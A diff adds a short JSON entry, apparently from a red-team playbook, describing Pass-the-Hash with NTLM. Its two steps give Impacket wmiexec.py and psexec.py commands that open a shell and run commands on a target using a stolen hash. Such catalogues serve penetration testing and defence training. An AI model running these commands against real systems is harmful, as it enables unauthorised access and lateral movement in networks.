@@ -1,0 +1,19 @@
+{
+	"name": "Pass-the-Hash (NTLM)",
+	"description": "Authenticate using NTLM hash without password.",
+	"tools": [],
+	"steps": [
+		{
+			"index": 1,
+			"name": "PTH with wmiexec",
+			"command": "wmiexec.py -hashes :NTLMHASH domain/user@target",
+			"description": "Semi-interactive shell."
+		},
+		{
+			"index": 2,
+			"name": "PsExec",
+			"command": "psexec.py -hashes :NTLMHASH domain/user@target",
+			"description": "Full command execution."
+		}
+	]
+}
